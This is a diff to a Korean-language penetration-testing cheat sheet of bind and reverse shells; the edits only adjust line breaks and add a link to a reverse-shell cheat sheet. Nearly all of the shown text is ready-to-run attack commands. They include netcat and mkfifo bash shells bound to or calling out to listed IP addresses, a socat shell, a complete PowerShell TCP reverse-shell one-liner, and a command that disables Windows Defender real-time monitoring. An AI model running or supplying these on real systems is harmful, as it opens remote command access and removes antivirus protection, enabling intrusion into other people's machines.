@@ -1,7 +1,7 @@
 # 1. Bind Shells
 
 ### 서버 - Bash 셸을 TCP 세션에 바인딩
-```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 192.168.1.1 7777 > /tmp/f```<br/>
+```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 192.168.1.1 7777 > /tmp/f```<br/><br/>
 ```nc -nv 192.168.1.1 7777```
 
 <br/><br/>
@@ -12,7 +12,7 @@
 ```nc -e /bin/sh 10.0.3.4 8443```
 
 ### 클라이언트 - Bash 셸과 nc 세션을 사용하여 연결
-```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.3.4 8443 > /tmp/f```<br/>
+```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.3.4 8443 > /tmp/f```
 
 ### 클라이언트 - socat을 사용하여 연결
 ```socat TCP4:10.10.3.4:8443 EXEC:/bin/bash```
@@ -21,6 +21,9 @@
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+
+### 참고
+[reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 #### Windows Defender 비활성화(PowerShell 연결 차단될 경우)
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
